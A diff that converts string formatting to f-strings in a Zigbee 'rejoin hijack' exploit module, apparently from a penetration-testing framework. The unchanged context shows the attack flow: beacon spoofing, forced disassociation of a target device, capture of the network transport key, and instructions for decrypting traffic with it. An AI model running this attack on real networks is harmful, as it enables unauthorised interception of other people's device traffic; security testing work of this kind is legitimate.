@@ -61,7 +61,7 @@ def _pan_id_to_bytes(pan_hex: str) -> bytes:
 
 def _bytes_to_hex(data: bytes) -> str:
     """Format raw bytes as colon-separated hex string."""
-    return ":".join("{:02x}".format(b) for b in data)
+    return ":".join(f"{b:02x}" for b in data)
 
 
 def _validate_channel(channel: int) -> bool:
@@ -203,7 +203,7 @@ class Exploit(Exploit):
             return ser
         except (serial.SerialException, OSError) as exc:
             raise ConnectionError(
-                "Cannot open Zigbee dongle on '{}': {}".format(port, exc)
+                f"Cannot open Zigbee dongle on '{port}': {exc}"
             )
 
     def _dongle_set_channel(self, ser: serial.Serial, channel: int) -> bool:
@@ -366,7 +366,7 @@ class Exploit(Exploit):
             packets_seen += 1
 
             if self._detect_rejoin_response(pkt):
-                print_info("Rejoin response detected (packet #{})".format(packets_seen))
+                print_info(f"Rejoin response detected (packet #{packets_seen})")
 
             key = self._extract_transport_key(pkt)
             if key:
@@ -374,11 +374,9 @@ class Exploit(Exploit):
 
             if packets_seen % 50 == 0:
                 remaining = int(deadline - time.monotonic())
-                print_status("  Captured {} packets, {} seconds remaining...".format(
-                    packets_seen, max(0, remaining)
-                ))
+                print_status(f"  Captured {packets_seen} packets, {max(0, remaining)} seconds remaining...")
 
-        print_info("Total packets captured during listen window: {}".format(packets_seen))
+        print_info(f"Total packets captured during listen window: {packets_seen}")
         return None
 
     # ------------------------------------------------------------------ #
@@ -413,9 +411,7 @@ class Exploit(Exploit):
         """Execute the Zigbee rejoin hijack attack."""
         ch = int(self.channel)
         if not _validate_channel(ch):
-            print_error("Invalid channel {}. Must be between {} and {}".format(
-                ch, _CHANNEL_MIN, _CHANNEL_MAX
-            ))
+            print_error(f"Invalid channel {ch}. Must be between {_CHANNEL_MIN} and {_CHANNEL_MAX}")
             return
 
         target_hex = str(self.target).strip()
@@ -431,26 +427,26 @@ class Exploit(Exploit):
             target_bytes = _short_addr_to_bytes(target_hex)
             pan_bytes = _pan_id_to_bytes(pan_hex)
         except (ValueError, struct.error) as exc:
-            print_error("Invalid address format: {}".format(exc))
+            print_error(f"Invalid address format: {exc}")
             return
 
         coord_addr = struct.pack("<H", 0x0000)
 
         print_status("Zigbee Rejoin Hijack")
-        print_status("  Channel: {}".format(ch))
-        print_status("  PAN ID:  {}".format(pan_hex))
-        print_status("  Target:  {}".format(target_hex))
-        print_status("  Dongle:  {}".format(self.interface))
+        print_status(f"  Channel: {ch}")
+        print_status(f"  PAN ID:  {pan_hex}")
+        print_status(f"  Target:  {target_hex}")
+        print_status(f"  Dongle:  {self.interface}")
 
         ser = None
         try:
             ser = self._open_dongle()
-            print_success("Dongle opened on '{}'".format(self.interface))
+            print_success(f"Dongle opened on '{self.interface}'")
 
             if not self._dongle_set_channel(ser, ch):
-                print_error("Failed to set channel {}".format(ch))
+                print_error(f"Failed to set channel {ch}")
                 return
-            print_info("Channel set to {}".format(ch))
+            print_info(f"Channel set to {ch}")
 
             if not self._dongle_start_capture(ser):
                 print_warning("Capture start command returned no ACK; continuing")
@@ -458,17 +454,17 @@ class Exploit(Exploit):
             # Phase 1: beacon spoofing
             print_status("Phase 1: Spoofing coordinator beacons...")
             beacon_count = self._phase_beacon_spoof(ser, pan_bytes, coord_addr)
-            print_success("Sent {} spoofed beacon frames".format(beacon_count))
+            print_success(f"Sent {beacon_count} spoofed beacon frames")
 
             # Phase 2: disassociation
-            print_status("Phase 2: Sending disassociation to target {}...".format(target_hex))
+            print_status(f"Phase 2: Sending disassociation to target {target_hex}...")
             disassoc_count = self._phase_disassoc(ser, pan_bytes, coord_addr, target_bytes)
-            print_success("Sent {} disassociation frames".format(disassoc_count))
+            print_success(f"Sent {disassoc_count} disassociation frames")
 
             # Phase 3: second beacon burst to trigger rejoin
             print_status("Phase 3: Second beacon burst to lure rejoin...")
             beacon_count2 = self._phase_beacon_spoof(ser, pan_bytes, coord_addr)
-            print_success("Sent {} additional beacon frames".format(beacon_count2))
+            print_success(f"Sent {beacon_count2} additional beacon frames")
 
             # Phase 4: capture rejoin handshake
             print_status("Phase 4: Listening for rejoin handshake (30 seconds)...")
@@ -476,8 +472,8 @@ class Exploit(Exploit):
 
             if key:
                 print_success("Transport key captured!")
-                print_success("  Network Key: {}".format(_bytes_to_hex(key)))
-                print_warning("This key enables decryption of all network traffic on PAN {}".format(pan_hex))
+                print_success(f"  Network Key: {_bytes_to_hex(key)}")
+                print_warning(f"This key enables decryption of all network traffic on PAN {pan_hex}")
                 print_info("Use the key with Wireshark: Edit > Preferences > Protocols > ZigBee > Pre-configured Keys")
             else:
                 print_warning("No transport key captured during listen window")
@@ -489,10 +485,10 @@ class Exploit(Exploit):
 
         except ConnectionError as exc:
             print_error(str(exc))
-            print_info("Verify dongle is connected and accessible: {}".format(self.interface))
+            print_info(f"Verify dongle is connected and accessible: {self.interface}")
 
         except (serial.SerialException, OSError) as exc:
-            print_error("Serial communication error: {}".format(exc))
+            print_error(f"Serial communication error: {exc}")
 
         finally:
             if ser:
